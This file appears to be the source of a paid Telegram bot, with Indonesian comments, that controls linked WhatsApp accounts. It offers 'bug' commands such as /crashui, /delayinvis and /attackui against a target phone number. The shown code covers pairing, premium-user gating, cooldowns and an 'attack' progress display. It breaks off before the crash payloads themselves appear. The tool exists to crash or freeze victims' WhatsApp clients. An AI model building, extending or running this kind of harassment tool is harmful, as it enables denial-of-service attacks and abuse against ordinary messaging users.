// CREDIT SARAH
const config = require("./config.js");
const { Telegraf } = require("telegraf");
const {
  default: makeWASocket,
  proto,
  DisconnectReason,
  useMultiFileAuthState,
  generateWAMessageContent,
  generateWAMessage,
  prepareWAMessageMedia,
  generateWAMessageFromContent,
} = require("lotusbail");
const fs = require("fs");
const P = require("pino");
const chalk = require("chalk");
const path = require("path");
const axios = require("axios");
const ms = require("ms");
const crypto = require("crypto");
const token = config.BOT_TOKEN;
const { BOT_TOKEN } = require("./config");
const bot = new Telegraf(token);

const sessions = new Map();
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const USER_VIP_FILE = "./database/uservip.json";
const COOLDOWN_FILE = "./cooldown.json";
const OWNER_ID = config.OWNER_ID;
const tdxlol = fs.readFileSync('./tdx.jpeg');

// Fungsi untuk menyimpan sesi aktif
function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

// Fungsi untuk inisialisasi koneksi WhatsApp
async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(chalk.blue(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`));

      for (const botNumber of activeNumbers) {
        console.log(chalk.green(`Mencoba menghubungkan WhatsApp: ${botNumber}`));
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        const Aii = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          Aii.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(chalk.green.bold(`Bot ${botNumber} terhubung!`));
              sessions.set(botNumber, Aii);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          Aii.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

// Fungsi untuk membuat direktori sesi
function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

// Fungsi untuk menghubungkan ke WhatsApp
async function connectToWhatsApp(botNumber, ctx) {
  let statusMessage = await ctx.replyWithHTML(`
╭─────────────────
│    <b>MEMULAI</b>    
│────────────────
│ Bot: <code>${botNumber}</code>
│ Status: <i>Inisialisasi...</i>
╰─────────────────`);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const Aii = makeWASocket({
    auth: state,
    printQRInTerminal: true,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  Aii.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await ctx.telegram.editMessageText(
          ctx.chat.id,
          statusMessage.message_id,
          null,`
╭─────────────────
│    <b>RECONNECTING</b>    
│────────────────
│ Bot: <code>${botNumber}</code>
│ Status: <i>Mencoba menghubungkan...</i>
╰─────────────────`,
          { parse_mode: "HTML" }
        );
        await connectToWhatsApp(botNumber, ctx);
      } else {
        await ctx.telegram.editMessageText(
          ctx.chat.id,
          statusMessage.message_id,
          null,`
╭─────────────────
│    <b>KONEKSI GAGAL</b>    
│────────────────
│ Bot: <code>${botNumber}</code>
│ Status: <i>Tidak dapat terhubung</i>
╰─────────────────`,
          { parse_mode: "HTML" }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, Aii);
      saveActiveSessions(botNumber);
      await ctx.telegram.editMessageText(
        ctx.chat.id,
        statusMessage.message_id,
        null,`
╭─────────────────
│    <b>TERHUBUNG</b>    
│────────────────
│ Bot: <code>${botNumber}</code>
│ Status: <i>Berhasil terhubung!</i>
╰─────────────────`,
        { parse_mode: "HTML" }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await Aii.requestPairingCode(botNumber);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await ctx.telegram.editMessageText(
            ctx.chat.id,
            statusMessage.message_id,
            null,`
╭─────────────────
│    <b>KODE PAIRING</b>    
│────────────────
│ Bot: <code>${botNumber}</code>
│ Kode: <code>${formattedCode}</code>
╰─────────────────`,
            { parse_mode: "HTML" }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await ctx.telegram.editMessageText(
          ctx.chat.id,
          statusMessage.message_id,
          null,`
╭─────────────────
│    <b>ERROR</b>    
│────────────────
│ Bot: <code>${botNumber}</code>
│ Pesan: <code>${error.message}</code>
╰─────────────────`,
          { parse_mode: "HTML" }
        );
      }
    }
  });

  Aii.ev.on("creds.update", saveCreds);

  return Aii;
}

// Fungsi inisialisasi bot
function startBarAnimation() {
  const barLength = 24;
  const block = "▰";
  const empty = "▱";
  const fillLength = 6;
  let pos = 0;
  let direction = 1;

  setInterval(() => {
    // Bangun ulang baris animasi
    let bar = "";
    for (let i = 0; i < barLength; i++) {
      if (i >= pos && i < pos + fillLength) {
        bar += chalk.whiteBright(block);
      } else {
        bar += chalk.gray(empty);
      }
    }

    // Clear layar dan tampilkan bar lengkap setiap update (biar pasti muncul)
    console.clear();
    console.log(chalk.bold.white(`
⢻⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⠤⠤⠴⢶⣶⡶⠶⠤⠤⢤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⠁
⠀ ⠻⣯⡗⢶⣶⣶⣶⣶⢶⣤⣄⣀⣀⡤⠒⠋⠁⠀⠀⠀⠀⠚⢯⠟⠂⠀⠀⠀⠀⠉⠙⠲⣤⣠⡴⠖⣲⣶⡶⣶⣿⡟⢩⡴⠃⠀
 ⠀⠀⠈⠻⠾⣿⣿⣬⣿⣾⡏⢹⣏⠉⠢⣄⣀⣀⠤⠔⠒⠊⠉⠉⠉⠉⠑⠒⠀⠤⣀⡠⠚⠉⣹⣧⣝⣿⣿⣷⠿⠿⠛⠉⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⣹⠟⠛⠿⣿⣤⡀⣸⠿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠾⣇⢰⣶⣿⠟⠋⠉⠳⡄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⡞⠁⠀⠀⡠⢾⣿⣿⣯⠀⠈⢧⡀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠁⢀⣿⣿⣯⢼⠓⢄⠀⢀⡘⣦⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣰⣟⣟⣿⣀⠎⠀⠀⢳⠘⣿⣷⡀⢸⣿⣶⣤⣄⣀⣤⢤⣶⣿⡇⢀⣾⣿⠋⢀⡎⠀⠀⠱⣤⢿⠿⢷⡀⠀⠀⠀⠀
⠀⠀⠀⠀⣰⠋⠀⠘⣡⠃⠀⠀⠀⠈⢇⢹⣿⣿⡾⣿⣻⣖⠛⠉⠁⣠⠏⣿⡿⣿⣿⡏⠀⡼⠀⠀⠀⠀⠘⢆⠀⠀⢹⡄⠀⠀⠀
⠀⠀⠀⢰⠇⠀⠀⣰⠃⠀⠀⣀⣀⣀⣼⢿⣿⡏⡰⠋⠉⢻⠳⣤⠞⡟⠀⠈⢣⡘⣿⡿⠶⡧⠤⠄⣀⣀⠀⠈⢆⠀⠀⢳⠀⠀⠀
⠀⠀⠀⡟⠀⠀⢠⣧⣴⣊⣩⢔⣠⠞⢁⣾⡿⢹⣷⠋⠀⣸⡞⠉⢹⣧⡀⠐⢃⢡⢹⣿⣆⠈⠢⣔⣦⣬⣽⣶⣼⣄⠀⠈⣇⠀⠀
⠀⠀⢸⠃⠀⠘⡿⢿⣿⣿⣿⣛⣳⣶⣿⡟⣵⠸⣿⢠⡾⠥⢿⡤⣼⠶⠿⡶⢺⡟⣸⢹⣿⣿⣾⣯⢭⣽⣿⠿⠛⠏⠀⠀⢹⠀⠀
⠀⠀⢸⠀⠀⠀⡇⠀⠈⠙⠻⠿⣿⣿⣿⣇⣸⣧⣿⣦⡀⠀⣘⣷⠇⠀⠄⣠⣾⣿⣯⣜⣿⣿⡿⠿⠛⠉⠀⠀⠀⢸⠀⠀⢸⡆⠀
⠀⠀⢸⠀⠀⠀⡇⠀⠀⠀⠀⣀⠼⠋⢹⣿⣿⣿⡿⣿⣿⣧⡴⠛⠀⢴⣿⢿⡟⣿⣿⣿⣿⠀⠙⠲⢤⡀⠀⠀⠀⢸⡀⠀⢸⡇⠀
⠀⠀⢸⣀⣷⣾⣇⠀⣠⠴⠋⠁⠀⠀⣿⣿⡛⣿⡇⢻⡿⢟⠁⠀⠀⢸⠿⣼⡃⣿⣿⣿⡿⣇⣀⣀⣀⣉⣓⣦⣀⣸⣿⣿⣼⠁⠀
⠀⠀⠸⡏⠙⠁⢹⠋⠉⠉⠉⠉⠉⠙⢿⣿⣅⠀⢿⡿⠦⠀⠁⠀⢰⡃⠰⠺⣿⠏⢀⣽⣿⡟⠉⠉⠉⠀⠈⠁⢈⡇⠈⠇⣼⠀⠀
⠀⠀⠀⢳⠀⠀⠀⢧⠀⠀⠀⠀⠀⠀⠈⢿⣿⣷⣌⠧⡀⢲⠄⠀⠀⢴⠃⢠⢋⣴⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⡸⠀⠀⢠⠇⠀⠀
⠀⠀⠀⠈⢧⠀⠀⠈⢦⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣧⠐⠸⡄⢠⠀⢸⠀⢠⣿⣟⡿⠋⠀⠀⠀⠀⠀⠀⠀⡰⠁⠀⢀⡟⠀⠀⠀
⠀⠀⠀⠀⠈⢧⠀⠀⠀⠣⡀⠀⠀⠀⠀⠀⠀⠈⠛⢿⡇⢰⠁⠸⠄⢸⠀⣾⠟⠉⠀⠀⠀⠀⠀⠀⠀⢀⠜⠁⠀⢀⡞⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⢧⡀⠀⠀⠙⢄⠀⠀⠀⠀⠀⠀⠀⢨⡷⣜⠀⠀⠀⠘⣆⢻⠀⠀⠀⠀⠀⠀⠀⠀⡴⠋⠀⠀⣠⠎⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠑⢄⠀⠀⠀⠑⠦⣀⠀⠀⠀⠀⠈⣷⣿⣦⣤⣤⣾⣿⢾⠀⠀⠀⠀⠀⣀⠴⠋⠀⠀⢀⡴⠃⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⢄⡀⢸⣶⣿⡑⠂⠤⣀⡀⠱⣉⠻⣏⣹⠛⣡⠏⢀⣀⠤⠔⢺⡧⣆⠀⢀⡴⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⢽⡁⠀⠀⠀⠀⠈⠉⠙⣿⠿⢿⢿⠍⠉⠀⠀⠀⠀⠉⣻⡯⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠲⠤⣀⣀⡀⠀⠈⣽⡟⣼⠀⣀⣀⣠⠤⠒⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⢻⡏⠉⠉⠁⠀⠀⠀⠀⠀⠀
⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈
█▄░▄█ ▄▀▄ █▀▀▄ ▀▀▀█ ▀▀▀█
█░█░█ █▀█ █▐█▀ ░▄▀░ ░▄▀░
▀░░░▀ ▀░▀ ▀░▀▀ ▀▀▀▀ ▀▀▀▀
                                  `));

    // Tampilkan bar animasi di bawah banner
    console.log(chalk.green.bgHex("#e74c3c").bold(`\n[ VIP ] Marzz Official..\n`));
    console.log(chalk.bold.white(`${bar}`));

    // Geser posisi
    pos += direction;
    if (pos + fillLength >= barLength || pos <= 0) direction *= -1;

  }, 800);
}

async function initializeBot() {
  startBarAnimation();
  await initializeWhatsAppConnections();
}

initializeBot();

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// Fungsi untuk membaca data user VIP dari file
function readUserVipData() {
  try {
    if (fs.existsSync(USER_VIP_FILE)) {
      const data = fs.readFileSync(USER_VIP_FILE);
      return JSON.parse(data);
    } else {
      return {};
    }
  } catch (error) {
    console.error("Error reading user VIP data:", error);
    return {};
  }
}

// Fungsi untuk menyimpan data user VIP ke file
function saveUserVipData(data) {
  try {
    fs.writeFileSync(USER_VIP_FILE, JSON.stringify(data, null, 2));
  } catch (error) {
    console.error("Error saving user VIP data:", error);
  }
}

// Fungsi untuk membaca data cooldown dari file
function readCooldownData() {
  try {
    if (fs.existsSync(COOLDOWN_FILE)) {
      const data = fs.readFileSync(COOLDOWN_FILE);
      return JSON.parse(data);
    } else {
      return { payload: { cooldown: 0, lastUsed: 0 } }; // Default cooldown 0 (disabled)
    }
  } catch (error) {
    console.error("Error reading cooldown data:", error);
    return { payload: { cooldown: 0, lastUsed: 0 } };
  }
}

// Fungsi untuk menyimpan data cooldown ke file
function saveCooldownData(data) {
  try {
    fs.writeFileSync(COOLDOWN_FILE, JSON.stringify(data, null, 2));
  } catch (error) {
    console.error("Error saving cooldown data:", error);
  }
}

// Fungsi untuk mengecek apakah user adalah VIP
function isVip(userId) {
  const userVipData = readUserVipData();
  return userVipData.hasOwnProperty(userId.toString());
}

// fungsi owner
function isOwner(userId) {
  return OWNER_ID.includes(userId.toString());
}

const checkOwner = (ctx, next) => {
  const ReplyA = "https://files.catbox.moe/c77kqk.jpeg";
    if (!config.OWNER_ID.includes(ctx.from.id.toString())) {
        return ctx.replyWithPhoto(ReplyA, {
      caption: `<pre>❌ Command ini Khusus Pemilik Bot</pre>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "𝖮𝗐𝗇𝖾𝗋", url: "https://t.me/MarzzOfficial" },
            { text: "𝖬𝗒 𝖢𝗁𝖺𝗇𝖾𝗅", url: "https://t.me/Marzzganteng" }
          ],
          [
            { text: "𝐓𝐨̬ 𝐌𝐞̬͠𝐧𝐮", callback_data: "/menu" }
          ]
        ]
      }
    });
    }
    next();
};

const checkPremium = (ctx, next) => {
  const userVipData = readUserVipData();
  const ReplyA = "https://files.catbox.moe/3jdtwx.jpeg";

  if (!userVipData.hasOwnProperty(ctx.from.id.toString())) {
    return ctx.replyWithPhoto(ReplyA, {
      caption: `<pre><b>⚠️ 𝗔𝗸𝘀𝗲𝘀 𝗗𝗶𝘁𝗼𝗹𝗮𝗸</b>\nAnda belum terdaftar di user premium.</pre>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "𝖮𝗐𝗇𝖾𝗋", url: "https://t.me/MarzzOfficial" },
            { text: "𝖬𝗒 𝖢𝗁𝖺𝗇𝖾𝗅", url: "https://t.me/Marzzganteng" }
          ],
          [
            { text: "𝐓𝐨̬ 𝐌𝐞̬͠𝐧𝐮", callback_data: "/menu" }
          ]
        ]
      }
    });
  }

  next();
};

const SasukeJpg = [
  "https://files.catbox.moe/c77kqk.jpeg",
  "https://files.catbox.moe/3jdtwx.jpeg",
  "https://files.catbox.moe/jdqvhu.jpeg", 
  "https://files.catbox.moe/fq117t.jpeg"
];

function RandomBjir() {
  const randomIndex = Math.floor(Math.random() * SasukeJpg.length);
  return SasukeJpg[randomIndex];
}

// Fungsi tombol utama di pisah karna ya karna aja wkwk, canda karna biar ga perlu manggil button lain saat tekan buttonnya.
function ButtonReply() {
   return [
      [
        { text: "𝐁𝐔᳟ͮ𝐆°𝐌𝐞̬͠𝐧𝐮", callback_data: "/bugmenu" },
        { text: "𝐀𝐥𝐥᳟𝐌𝐞̬͠𝐧𝐮", callback_data: "/allmenu" },
        { text: "𝐓𝐡᳟𝐚̷͠𝐧͢𝐤𝐬 𝐓𝐨̬", callback_data: "/thanksto" }
      ],
      [
        { text: "𝐓𝐨̬ 𝐌𝐞̬͠𝐧𝐮", callback_data: "/menu" }
      ],
      [
        { text: "Information", url: "https://t.me/MarzzOfficiall" }
      ]
   ];
}

// --- Menu Utama Type Case Ala-Ala Siroo😆😆🫶---
bot.command(["menu", "start"], async (ctx) => {
  const imageUrl = RandomBjir(); // fungsi gambar acak
  const userId = ctx.from.id;
  const isPremium = isVip(userId) ? "✅" : "❌";
  const username = ctx.from.username || "User";

  const caption = `
(🖐) - ハロー <i>${username}</i> 私は 𝑳𝑼𝑭𝑭𝒀 𝑰𝑵𝑭𝑰𝑵𝑰𝑻𝒀 私はあなたを支援する準備ができている𝑴𝑨𝑹𝒁𝒁によって作成された人工知能です
━━━━━━━━━━━━━━━━━━━━━━━━━━
     ⌜ ɪɴғᴏʀᴍᴀᴛɪᴏɴ ⌟
<b>▢ 𝖮𝗐𝗇𝖾𝗋 :</b> @MarzzOfficial
<b>▢ 𝖵𝖾𝗋𝗌𝗂𝗈𝗇 :</b> <code>3.0.0</code>
<b>▢ 𝖯𝗋𝖾𝗆𝗂𝗎𝗆 :</b> ${isPremium}

<blockquote>© Marzz Official 3.0.0 (VIP)</blockquote>`;

  await ctx.replyWithPhoto(imageUrl, {
    caption,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: ButtonReply()
    }
  });
});
//=== Action Callback Query nya ====\\
bot.on("callback_query", async (ctx) => {
  const data = ctx.callbackQuery?.data;
  const msg = ctx.callbackQuery.message;
  const chatId = msg.chat.id;
  const msgId = msg.message_id;
  const userId = ctx.from.id;
  const imageUrl = RandomBjir();
  const username = ctx.from.username || "User";
  const isPremium = isVip(userId) ? "✅" : "❌";

  let caption = "";

  switch (data) {
    case "/bugmenu":
      caption = `<blockquote>
╭──( <b>Delay hard</b> )
│/mention 628××
│/delayinvis 628××
╰───────────────⬣
╭──( <b>Attack ui</b> )
│/attackui 628××
│/crashui 628××
╰───────────────⬣

© Marzz Official 3.0.0 (VIP)</blockquote>`;
    await ctx.editMessageMedia({
		type: 'photo',
		media: imageUrl
	}, {
		reply_markup: {
		inline_keyboard: ButtonReply()
		}
	});

	await ctx.editMessageCaption(caption, {
		caption: caption,
		parse_mode: 'HTML',
		reply_markup: {
		inline_keyboard: ButtonReply()
		}
	});
    break;

    case "/allmenu":
      caption = `<blockquote><b>I am an automated system (WhatsApp Bot) that can help to do something, search and get data / information only through WhatsApp</b>

<b>─Information</b>
⬡ Author: Marzz Official
⬡ User: ${username}
⬡ Premium: ${isPremium}

╭──( <b>Other Menu</b> )
│» /addprem
│» /delprem
│» /listprem
│» /addbot 
│» /listbot
│» /setcd
╰───────────────⬣

╭──( <b>Bug Menu</b> )
│» /mention 628××
│» /delayinvis 628××
│» /attackui 628××
│» /crashui 628××
╰───────────────⬣

© Marzz Official 3.0.0 (VIP)</blockquote>`;
    await ctx.editMessageMedia({
		type: 'photo',
		media: imageUrl
	}, {
		reply_markup: {
		inline_keyboard: ButtonReply()
		}
	});

	await ctx.editMessageCaption(caption, {
		caption: caption,
		parse_mode: 'HTML',
		reply_markup: {
		inline_keyboard: ButtonReply()
		}
	});
    break;

    case "/thanksto":
    {
      caption = `<b>I am an automated system (WhatsApp Bot) that can help to do something, search and get data / information only through WhatsApp</b>

<b>─Information</b>
⬡ Author: Marzz Official
⬡ User: ${username}
⬡ Premium: ${isPremium}

╭─( <b>𝗧𝗛𝗔𝗡𝗞𝗦 𝗧𝗢 𝗔𝗟𝗟</b> )
┃ᯓ★ ᴀʟʟᴀʜ [ ᴍʏ ɢᴏᴅ ]
┃ᯓ★ ᴏʀᴛᴜ [ ʙɪɢ sᴜᴘᴘᴏʀᴛ ]
┃ᯓ★ ᴍᴀʀᴢᴢ ᴏғғɪᴄɪᴀʟ [ ᴅᴇᴠᴇʟᴏᴘᴇʀ ]
┃ᯓ★ ᴀʀᴜɴ [ ᴛᴀɴɢᴀɴ ᴋᴀɴᴀɴ ]
┃ᯓ★ ᴀʟʟ ᴘᴀʀᴛɴᴇʀ
┃ᯓ★ ᴀʟʟ ʙᴜʏᴇʀ sᴄʀɪᴘᴛ
╰━━━━━━━━━━━━━━━━━⟢

<b>📋message from me</b>
<pre>Thank you to all my friends who have supported me. And thank you also to those who bought this script, without you I can't do anything :)</pre>\n<i>© Marzz Official 3.0.0 (VIP)</i>`;
    await ctx.editMessageMedia({
		type: 'photo',
		media: imageUrl
	}, {
		reply_markup: {
		inline_keyboard: ButtonReply()
		}
	});

	await ctx.editMessageCaption(caption, {
		caption: caption,
		parse_mode: 'HTML',
		reply_markup: {
		inline_keyboard: ButtonReply()
		}
	});
	}
    break;
      
      case "/menu":
      {
      caption = `
(🖐) - ハロー <i>${username}</i> 私は 𝑳𝑼𝑭𝑭𝒀 𝑰𝑵𝑭𝑰𝑵𝑰𝑻𝒀 私はあなたを支援する準備ができている𝑴𝑨𝑹𝒁𝒁によって作成された人工知能です
━━━━━━━━━━━━━━━━━━━━━━━━━━
     ⌜ ɪɴғᴏʀᴍᴀᴛɪᴏɴ ⌟
<b>▢ 𝖮𝗐𝗇𝖾𝗋 :</b> @MarzzOfficial
<b>▢ 𝖵𝖾𝗋𝗌𝗂𝗈𝗇 :</b> <code>3.0.0</code>
<b>▢ 𝖯𝗋𝖾𝗆𝗂𝗎𝗆 :</b> ${isPremium}

<blockquote>© Marzz Official 3.0.0 (VIP)</blockquote>`;
    await ctx.editMessageMedia({
		type: 'photo',
		media: imageUrl
	}, {
		reply_markup: {
		inline_keyboard: ButtonReply()
		}
	});

	await ctx.editMessageCaption(caption, {
		caption: caption,
		parse_mode: 'HTML',
		reply_markup: {
		inline_keyboard: ButtonReply()
		}
	});
	}
    break;

    default:
      return ctx.answerCbQuery("Menu tidak ditemukan!");
  }

  await ctx.answerCbQuery(); // biar tombolnya kaga loading terus cok
});

bot.command("addbot", checkOwner, async (ctx) => {
  const userId = ctx.from.id.toString();
  const botNumber = ctx.message.text.split(" ")[1]?.replace(/[^0-9]/g, "");

  if (!botNumber) {
    return ctx.reply("Format: /addbot <nomor_wa>");
  }

  try {
    await connectToWhatsApp(botNumber, ctx);
  } catch (error) {
    console.error("Error in addbot:", error);
    ctx.reply(
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});

// Fitur /listbot
bot.command("listbot", checkOwner, async (ctx) => {
  const userId = ctx.from.id.toString();
  
  try {
    let botList = "";
    for (const [botNumber, Aii] of sessions.entries()) {
      const status = Aii.user ? "🟢" : "🔴";
      botList += `${status} ${botNumber}\n`;
    }

    if (botList.length === 0) {
      botList = "❌ Tidak ada bot yang terhubung.";
    }

    await ctx.replyWithMarkdown(
      `
「 *STATUS BOT* 」

${botList}`
    );
  } catch (error) {
    console.error("Error in listbot:", error);
    await ctx.reply(
      "Terjadi kesalahan saat mengambil daftar bot. Silakan coba lagi."
    );
  }
});

// Fitur /addprem
bot.command('addprem', checkOwner, async (ctx) => {
    const args = ctx.message.text.trim().split(/\s+/);
    if (args.length < 2) {
        return ctx.reply("❌ Masukkan ID pengguna yang ingin dijadikan premium.\nContoh: /addprem 123456789");
    }

    const userId = args[1];

    if (!/^\d+$/.test(userId)) {
        return ctx.reply("❌ ID tidak valid. Harus berupa angka.");
    }

    const userVipData = readUserVipData();

    if (userVipData.hasOwnProperty(userId)) {
        return ctx.reply(`🟢 Pengguna <code>${userId}</code> sudah premium.`, { parse_mode: "HTML" });
    }

    // Tambahkan ke data premium
    userVipData[userId] = true;
    saveUserVipData(userVipData);

    return ctx.reply(`✅ Pengguna <code>${userId}</code> berhasil ditambahkan ke premium.`, { parse_mode: "HTML" });
});

// Perintah untuk menghapus pengguna premium (hanya owner)
bot.command('delprem', checkOwner, async (ctx) => {
    const args = ctx.message.text.trim().split(/\s+/);
    if (args.length < 2) {
        return ctx.reply("❌ Masukkan ID pengguna yang ingin dihapus dari premium.\nContoh: /delprem 123456789");
    }

    const userId = args[1];

    // Cek ulang data terbaru
    const userVipData = readUserVipData();

    if (!userVipData.hasOwnProperty(userId)) {
        return ctx.reply(`❌ Pengguna <code>${userId}</code> tidak ada dalam daftar premium.`, { parse_mode: "HTML" });
    }

    delete userVipData[userId];
    saveUserVipData(userVipData);

    return ctx.reply(`🚫 Pengguna <code>${userId}</code> berhasil dihapus dari daftar premium.`, { parse_mode: "HTML" });
});

// Fitur /listprem
bot.command("listprem", checkOwner, async (ctx) => {
  const userVipData = readUserVipData();

  if (Object.keys(userVipData).length === 0) {
    return ctx.reply("Tidak ada user VIP Premium yang terdaftar.");
  }

  let vipList = "";
  let i = 1;
  for (const userId in userVipData) {
    const username = userVipData[userId] ? `(${userVipData[userId]})` : "";
    vipList += `${i}. ${userId} ${username}\n`;
    i++;
  }

  await ctx.replyWithMarkdown(
    `
「 *DAFTAR PREMIUM* 」

${vipList}`
  );
});

// ... (kode sebelumnya dari jawaban sebelumnya) ...

bot.command("setcd", checkOwner, async (ctx) => {
  const userId = ctx.from.id.toString();
  const args = ctx.message.text.split(" ");
  const cooldownTime = args[1];

  if (!cooldownTime) {
    return ctx.reply("Format: /setcd <waktu>\nContoh: /setcd 1m");
  }

  const cooldown = ms(cooldownTime);

  if (isNaN(cooldown)) {
    return ctx.reply(
      "Format waktu tidak valid. Gunakan angka diikuti dengan satuan waktu (s, m, h, d).\nm (menit)\ns (detik)\nh (jam)\nd (hari)"
    );
  }

  const cooldownData = readCooldownData();
  cooldownData.payload.cooldown = cooldown;
  cooldownData.payload.lastUsed = 0; // Reset lastUsed
  saveCooldownData(cooldownData);

  await ctx.replyWithMarkdown(
    `✅ Cooldown untuk command /payload telah diatur ke *${ms(cooldown, {
      long: true,
    })}*`
  );
});

// ----------- [ END CASE MAIN MENU ] ----------- \\
bot.command("1hours", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply("Format: /1hours <628xxx>");
  }

  const targetNumber = args[1].replace(/[^0-9]/g, "");
  const jid = `${targetNumber}@s.whatsapp.net`;
  const username = ctx.from.username ? `@${ctx.from.username}` : "unknown";

  // Deteksi command dan mapping ke Bug Type
  const fullCommand = ctx.message.text.split(" ")[0];
  const commandName = fullCommand.replace("/", "").toLowerCase();

  const bugTypeMap = {
    "1hours": "1-hours"
  };

  const tybepug = bugTypeMap[commandName] || "UNKNOWN";

  // ⏳ Cooldown per command
  const cooldownData = readCooldownData();
  const now = Date.now();
  const lastUsed = cooldownData[commandName]?.lastUsed || 0;
  const cooldown = cooldownData[commandName]?.cooldown || 60 * 1000;

  if (now - lastUsed < cooldown) {
    const timeLeft = ms(lastUsed + cooldown - now);
    return ctx.replyWithMarkdown(`⚠️ *Cooldown*\nTunggu ${timeLeft} sebelum menggunakan command ini.`);
  }

  try {
    if (sessions.size === 0) {
      return ctx.reply("❌ Tidak ada bot WhatsApp yang terhubung. Gunakan /addbot terlebih dahulu.");
    }

    // progress awal
    const statusMessage = await ctx.replyWithMarkdown(`
\`\`\`css
(🍁) - G ⭑  𝑳𝑼𝑭𝑭𝒀 𝑰𝑵𝑭𝑰𝑵𝑰𝑻𝒀
Menyiapkan serangan ke target...
────────────────────────────
Target: ${targetNumber}
Progress: ▱▱▱▱▱▱▱▱▱ 0%
\`\`\`
`);

    const progressStages = [
      { bar: "▰▱▱▱▱▱▱▱▱ 10%", delay: 500 },
      { bar: "▰▰▱▱▱▱▱▱▱ 30%", delay: 600 },
      { bar: "▰▰▰▱▱▱▱▱▱ 40%", delay: 500 },
      { bar: "▰▰▰▰▱▱▱▱▱ 50%", delay: 500 },
      { bar: "▰▰▰▰▰▱▱▱▱ 60%", delay: 600 },
      { bar: "▰▰▰▰▰▰▱▱▱ 70%", delay: 500 },
      { bar: "▰▰▰▰▰▰▰▱▱ 80%", delay: 500 },
      { bar: "▰▰▰▰▰▰▰▰▱ 90%", delay: 600 },
      { bar: "▰▰▰▰▰▰▰▰▰ 100%\n✅ Target ditemukan", delay: 1000 }
    ];

    for (const stage of progressStages) {
      await new Promise(r => setTimeout(r, stage.delay));
      await ctx.telegram.editMessageText(
        ctx.chat.id,
        statusMessage.message_id,
        null,
        `\`\`\`css
(🍁) - G ⭑  𝑳𝑼𝑭𝑭𝒀 𝑰𝑵𝑭𝑰𝑵𝑰𝑻𝒀
Memulai pengiriman ke target...
────────────────────────────
Target: ${targetNumber}
